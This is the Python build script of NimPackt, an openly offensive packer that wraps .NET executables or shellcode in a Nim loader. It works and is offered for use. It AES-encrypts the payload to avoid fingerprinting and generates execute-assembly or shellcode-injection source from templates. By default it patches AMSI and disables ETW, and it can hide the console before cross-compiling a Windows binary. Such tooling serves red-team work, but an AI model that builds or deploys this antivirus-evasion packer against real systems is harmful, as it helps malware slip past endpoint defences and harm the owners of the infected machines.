#!/usr/bin/python3

  #-----
  #
  #   NimPackt - a Nim-Based C# (.NET) binary executable wrapper for OpSec & Profit
  #   By Cas van Cooten (@chvancooten)
  #
  #   This script formats the .NET bytecode and compiles the nim code.
  #   For usage please refer to README.md
  #
  #-----
  #
  #   References:
  #
  #       Based on OffensiveNim by Marcello Salvati (@byt3bl33d3r)
  #       https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim
  #       https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_amsiPatch_bin.nim
  #
  #
  #       Also inspired by the below post by Fabian Mosch (@S3cur3Th1sSh1t)
  #       https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/
  #
  #-----

import sys
import argparse
import binascii
import os
import base64
from Crypto.Cipher import AES
from Crypto.Util import Counter

### Base64 deprecated for AES encryption
# def base64EncodeInputFile(inFilename):
#     ### Deprecated code WITHIN deprecated code, how about that?!
#     # Construct the Nim bytearray in the right format
#     # Example: var buf: array[8, byte] = [byte 0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00]
#     # outFilename = inFilename + ".nimByteArray"

#     # if os.path.exists(outFilename):
#     #     print(f"File '{outFilename}' already exists, using bytearray from this file...")
#     #     with open(outFilename,'r') as outFile:
#     #         return outFile.read()

#     if not os.path.exists(inFilename):
#         raise SystemExit("ERROR: Input file is not valid.")

#     print("Encoding binary to embed...")
#     with open(inFilename,'rb') as inFile:
#         blob_data = bytearray(inFile.read())

#         ### DEPRECATED - Below code embeds the plaintext bytestring which can be fingerprinted
#         #result = f"let buf: array[{len(blob_data)}, byte] = [byte "
#         #result = result + ",".join ([f"{x:#0{4}x}" for x in blob_data])
#         #result = result + "]"
#         #
#         #with open(outFilename, 'w') as outFile:
#         #    outFile.write(result)
#         #    print(f"Wrote Nim bytestring to '{outFilename}'.")

#         result = f"let b64buf : noCryptString = \"{str(base64.b64encode(blob_data), 'utf-8')}\""

#     return result

def int_of_string(s):
    return int(binascii.hexlify(s), 16)

def encrypt_message(key, plaintext):
    iv = os.urandom(16)
    ctr = Counter.new(128, initial_value=int_of_string(iv))
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)
    return iv + aes.encrypt(plaintext) # TODO: Fix *nix 'TypeError: argument must be read-only bytes-like object, not bytearray'

def aesEncryptInputFile(inFilename):
    if not os.path.exists(inFilename):
        raise SystemExit("ERROR: Input file is not valid.")

    print("Encrypting binary to embed...")
    with open(inFilename,'rb') as inFile:
        plaintext = inFile.read()
        key =  os.urandom(16) # AES-128, so 16 bytes
        ciphertext = encrypt_message(key, plaintext)

        # Input is base64-encoded to reduce size and prevent OOM errors when compiling Nim
        cryptedInput = f"let b64buf : noCryptString = \"{str(base64.b64encode(ciphertext[16:]), 'utf-8')}\""

        # Define as bytearray to inject in Nim source code
        cryptIV = f"let cryptIV: array[{len(ciphertext[:16])}, byte] = [byte "
        cryptIV = cryptIV + ",".join ([f"{x:#0{4}x}" for x in ciphertext[:16]])
        cryptIV = cryptIV + "]"

        # cryptKey is defined as a const to place it at a different spot in the binary
        cryptKey = f"const cryptKey: array[{len(key)}, byte] = [byte "
        cryptKey = cryptKey + ",".join ([f"{x:#0{4}x}" for x in key])
        cryptKey = cryptKey + "]"

    return cryptedInput, cryptIV, cryptKey

def parseArguments(inArgs):
    # Construct the packed arguments in the right format (array split on space)
    if not inArgs:
        result = 'let arr = toCLRVariant([""], VT_BSTR)'
    elif inArgs == "PASSTHRU":
        result = 'let arr = toCLRVariant(commandLineParams(), VT_BSTR)'
    else:
        parsedArgs = inArgs.split(" ")
        parsedArgs = ', '.join('"{0}"'.format(w) for w in parsedArgs)
        result = f'let arr = toCLRVariant([{parsedArgs}], VT_BSTR)'

    return result
        
def generateSource_ExecuteAssembly(fileName, cryptedInput, cryptIV, cryptKey, argString, disableAmsi, disableEtw, verbose):
    # Construct the Nim source file based on the passed arguments, using the Execute-Assembly template 
    filenames = ["NimPackt-Template-Base.nim", "NimPackt-Template-ExecuteAssembly.nim"]
    result = ""
    for fname in filenames:
        with open(fname,'r') as templateFile:
            for line in templateFile:
                new_line = line.rstrip()
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTKEY ]#', cryptKey)
                new_line = new_line.replace('#[ PLACEHOLDERVERBOSE ]#', f"let verbose = {str(verbose).lower()}")
                new_line = new_line.replace('#[ PLACEHOLDERPATCHAMSI ]#', f"let optionPatchAmsi = {str(disableAmsi).lower()}")
                new_line = new_line.replace('#[ PLACEHOLDERDISABLEETW ]#', f"let optionDisableEtw = {str(disableEtw).lower()}")
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDINPUT ]#', cryptedInput)
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTIV ]#', cryptIV)
                new_line = new_line.replace('#[ PLACEHOLDERARGUMENTS ]#', argString)
                result += new_line +"\n"

    # Get output directory and name. Unfortunately nim does not allow hyphens or periods in the output file :/
    outDir = "./output/"
    outFilename = outDir + os.path.splitext(os.path.basename(fileName))[0].replace('-', '') + "ExecAssemblyNimPackt.nim"

    if not os.path.exists(outDir):
        os.makedirs(outDir)

    with open(outFilename, 'w') as outFile:
        outFile.write(result)
        print("Prepared Nim source file.")

    return outFilename

def generateSource_Shinject(fileName, cryptedInput, cryptIV, cryptKey, disableAmsi, disableEtw, verbose):
    # Construct the Nim source file based on the passed arguments, using the Execute-Assembly template 
    filenames = ["NimPackt-Template-Base.nim", "NimPackt-Template-Shinject.nim"]
    result = ""
    for fname in filenames:
        with open(fname,'r') as templateFile:
            for line in templateFile:
                new_line = line.rstrip()
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTKEY ]#', cryptKey)
                new_line = new_line.replace('#[ PLACEHOLDERVERBOSE ]#', f"let verbose = {str(verbose).lower()}")
                new_line = new_line.replace('#[ PLACEHOLDERPATCHAMSI ]#', f"let optionPatchAmsi = {str(disableAmsi).lower()}")
                new_line = new_line.replace('#[ PLACEHOLDERDISABLEETW ]#', f"let optionDisableEtw = {str(disableEtw).lower()}")
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDINPUT ]#', cryptedInput)
                new_line = new_line.replace('#[ PLACEHOLDERCRYPTIV ]#', cryptIV)
                result += new_line +"\n"

    # Get output directory and name. Unfortunately nim does not allow hyphens or periods in the output file :/
    outDir = "./output/"
    outFilename = outDir + os.path.splitext(os.path.basename(fileName))[0].replace('-', '') + "ShinjectNimPackt.nim"

    if not os.path.exists(outDir):
        os.makedirs(outDir)

    with open(outFilename, 'w') as outFile:
        outFile.write(result)
        print("Prepared Nim source file.")

    return outFilename

def compileNim(fileName, hideApp, x64):
    # Compile the generated Nim file for Windows (cross-compile if run from linux)
    # Compilation flags are focused on stripping and optimizing the output binary for size
    if x64:
        cpu = "amd64"
    else:
        cpu = "i386"
    
    if hideApp:
        gui = "gui"
    else:
        gui = "console"

    try:
        if os.name == 'nt':
            # Windows
            print("Compiling Nim binary (this may take a while)...")
            os.system(f"nim c -d:danger -d:strip -d:release --hints:off --opt:size --passc=-flto --passl=-flto --maxLoopIterationsVM:100000000 --app:{gui} --cpu={cpu} {fileName}")
        else:
            # Other (Unix)
            print("Cross-compiling Nim binary for Windows (this may take a while)...")
            os.system(f"nim c -d=mingw -d:danger -d:strip -d:release --hints:off --opt:size --passc=-flto --passl=-flto --maxLoopIterationsVM:100000000 --app:{gui} --cpu={cpu} {fileName}")
    except:
        e = sys.exc_info()[0]
        print(f"There was an error compiling the binary: {e}")

    os.remove(fileName)
    print("Successfully compiled Nim binary! Go forth and make a Nimpackt that matters 😎")
    

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser._action_groups.pop()
    required = parser.add_argument_group('required arguments')
    optional = parser.add_argument_group('optional arguments')

    required.add_argument('-i', '--inputfile', action='store', dest='inputfile', help='C# .NET binary executable (.exe) or shellcode (.bin) to wrap', required=True)
    optional.add_argument('-a', '--arguments', action='store', dest='arguments', default="PASSTHRU", nargs="?", const="", help='Arguments to "bake into" the wrapped binary, or "PASSTHRU" to accept run-time arguments (default)')
    optional.add_argument('-e', '--executionmode', action='store', dest='executionmode', default="execute-assembly", help='Execution mode of the packer. Supports "execute-assembly" (default), "shinject", "shinject-remote" (TODO)')
    optional.add_argument('-32', '--32bit', action='store_false', default=True, dest='x64', help='Compile in 32-bit mode')
    optional.add_argument('-H', '--hideapp', action='store_true', default=False, dest='hideApp', help='Hide the app frontend (console output) by compiling it in GUI mode')
    optional.add_argument('-na', '--nopatchamsi', action='store_false', default=True, dest='patchAmsi', help='Do NOT patch (disable) the Anti-Malware Scan Interface (AMSI)')
    optional.add_argument('-ne', '--nodisableetw', action='store_false', default=True, dest='disableEtw', help='Do NOT disable Event Tracing for Windows (ETW)')
    optional.add_argument('-v', '--verbose', action='store_true', default=False, dest='verbose', help='Print debug messages of the wrapped binary at runtime')
    optional.add_argument('-V', '--version', action='version', version='%(prog)s 0.8 Beta')

    args = parser.parse_args()

    if args.x64 == False:
        print("WARNING: Compiling in x86 mode may cause crashes. Compile generated .nim file manually in this case.")

    if args.executionmode in ["shinject-remote"]:
        raise SystemExit("ERROR: Sorry, remote shellcode injection is not supported yet. Coming Soon™️")

    if args.executionmode in ["shinject", "shinject-remote"] and args.arguments not in ["", "PASSTHRU"]:
        print("WARNING: Arguments will be ignored in shellcode mode.")

    cryptedInput, cryptIV, cryptKey = aesEncryptInputFile(args.inputfile)

    argString = parseArguments(args.arguments)

    if args.executionmode == "execute-assembly":
        sourceFile = generateSource_ExecuteAssembly(args.inputfile, cryptedInput, cryptIV, cryptKey,
            argString, args.patchAmsi, args.disableEtw, args.verbose)
    elif args.executionmode == "shinject":
        sourceFile = generateSource_Shinject(args.inputfile, cryptedInput, cryptIV, cryptKey,
            args.patchAmsi, args.disableEtw, args.verbose)
    else:
        raise SystemExit("ERROR: Argument 'executionmode' is not valid. Please specify either of 'execute-assembly', 'shinject', or 'shinject-remote'.")

    compileNim(sourceFile, args.hideApp, args.x64)